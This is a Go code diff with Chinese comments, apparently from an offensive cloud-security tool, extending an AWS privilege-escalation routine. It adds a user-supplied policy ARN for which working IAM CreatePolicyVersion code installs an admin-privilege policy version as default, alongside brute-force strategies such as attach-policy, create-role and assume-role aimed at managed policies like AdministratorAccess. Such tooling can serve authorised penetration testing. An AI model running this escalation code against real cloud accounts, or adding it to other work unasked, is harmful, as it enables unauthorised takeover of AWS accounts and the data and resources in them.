@@ -3986,7 +3986,7 @@ func (p *AWSProvider) ValidateCredentials() (bool, error) {
 }
 
 // EscalatePrivileges 权限提升 - 使用暴力枚举方法尝试不同的提权策略
-func (p *AWSProvider) EscalatePrivileges(escalationMethods []string) (map[string]interface{}, error) {
+func (p *AWSProvider) EscalatePrivileges(escalationMethods []string, policyARN string, extraParams map[string]interface{}) (map[string]interface{}, error) {
 	// 创建带有超时的上下文
 	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
 	defer cancel()
@@ -4017,19 +4017,31 @@ func (p *AWSProvider) EscalatePrivileges(escalationMethods []string) (map[string
 	}
 
 	// 策略执行映射
-	strategyMap := map[string]func(context.Context) (bool, map[string]interface{}){
-		"attachpolicy":        p.attemptAttachPolicy,
-		"putuserpolicy":       p.attemptPutUserPolicy,
-		"createrole":          p.attemptCreateRole,
-		"assumerole":          p.attemptAssumeRole,
-		"instanceprofile":     p.attemptInstanceProfile,
-		"createpolicyversion": p.attemptCreatePolicyVersion,
+	strategyMap := map[string]func(context.Context, string, map[string]interface{}) (bool, map[string]interface{}){
+		"attachpolicy": func(ctx context.Context, policyARN string, extraParams map[string]interface{}) (bool, map[string]interface{}) {
+			return p.attemptAttachPolicy(ctx)
+		},
+		"putuserpolicy": func(ctx context.Context, policyARN string, extraParams map[string]interface{}) (bool, map[string]interface{}) {
+			return p.attemptPutUserPolicy(ctx)
+		},
+		"createrole": func(ctx context.Context, policyARN string, extraParams map[string]interface{}) (bool, map[string]interface{}) {
+			return p.attemptCreateRole(ctx)
+		},
+		"assumerole": func(ctx context.Context, policyARN string, extraParams map[string]interface{}) (bool, map[string]interface{}) {
+			return p.attemptAssumeRole(ctx)
+		},
+		"instanceprofile": func(ctx context.Context, policyARN string, extraParams map[string]interface{}) (bool, map[string]interface{}) {
+			return p.attemptInstanceProfile(ctx)
+		},
+		"createpolicyversion": func(ctx context.Context, policyARN string, extraParams map[string]interface{}) (bool, map[string]interface{}) {
+			return p.attemptCreatePolicyVersion(ctx, policyARN, extraParams)
+		},
 	}
 
 	// 执行指定的策略
 	for _, strategy := range strategies {
 		if attemptFunc, exists := strategyMap[strategy]; exists {
-			if success, details := attemptFunc(ctx); success {
+			if success, details := attemptFunc(ctx, policyARN, extraParams); success {
 				successfulStrategies = append(successfulStrategies, strategy)
 				attempts = append(attempts, map[string]interface{}{
 					"strategy": strategy,
@@ -4499,7 +4511,7 @@ func (p *AWSProvider) attemptPutUserPolicy(ctx context.Context) (bool, map[strin
 }
 
 // attemptCreatePolicyVersion 尝试使用 createpolicyversion 策略提权
-func (p *AWSProvider) attemptCreatePolicyVersion(ctx context.Context) (bool, map[string]interface{}) {
+func (p *AWSProvider) attemptCreatePolicyVersion(ctx context.Context, policyARN string, extraParams map[string]interface{}) (bool, map[string]interface{}) {
 	steps := []string{}
 	details := map[string]interface{}{
 		"attempt": "Creating new policy version with admin privileges",
@@ -4517,7 +4529,33 @@ func (p *AWSProvider) attemptCreatePolicyVersion(ctx context.Context) (bool, map
 		]
 	}`
 
-	// 2. 尝试使用常见的 AWS 托管策略 ARN
+	// 2. 如果用户提供了 PolicyARN，直接尝试使用它
+	if policyARN != "" {
+		steps = append(steps, "Using user-provided policy ARN: "+policyARN)
+
+		// 尝试为指定的策略创建新版本
+		createPolicyVersionInput := &iam.CreatePolicyVersionInput{
+			PolicyArn:      aws.String(policyARN),
+			PolicyDocument: aws.String(policyDocument),
+			SetAsDefault:   true, // 设置为默认版本
+		}
+
+		_, err := p.iamClient.CreatePolicyVersion(ctx, createPolicyVersionInput)
+		if err != nil {
+			steps = append(steps, "Failed to create policy version: "+err.Error())
+			details["steps"] = steps
+			details["error"] = err.Error()
+			return false, details
+		}
+
+		steps = append(steps, "Successfully created policy version for: "+policyARN)
+		details["steps"] = steps
+		details["policyARN"] = policyARN
+		details["success"] = true
+		return true, details
+	}
+
+	// 3. 尝试使用常见的 AWS 托管策略 ARN
 	commonPolicyARNs := []string{
 		"arn:aws:iam::aws:policy/AdministratorAccess",
 		"arn:aws:iam::aws:policy/AmazonEC2FullAccess",
@@ -4527,11 +4565,11 @@ func (p *AWSProvider) attemptCreatePolicyVersion(ctx context.Context) (bool, map
 
 	steps = append(steps, "Attempting to create policy versions for common AWS managed policies")
 
-	// 3. 尝试为每个常见策略创建新版本
+	// 4. 尝试为每个常见策略创建新版本
 	for _, policyARN := range commonPolicyARNs {
 		steps = append(steps, "Attempting to create new version for policy: "+policyARN)
 
-		// 4. 创建新的策略版本
+		// 5. 创建新的策略版本
 		createPolicyVersionInput := &iam.CreatePolicyVersionInput{
 			PolicyArn:      aws.String(policyARN),
 			PolicyDocument: aws.String(policyDocument),
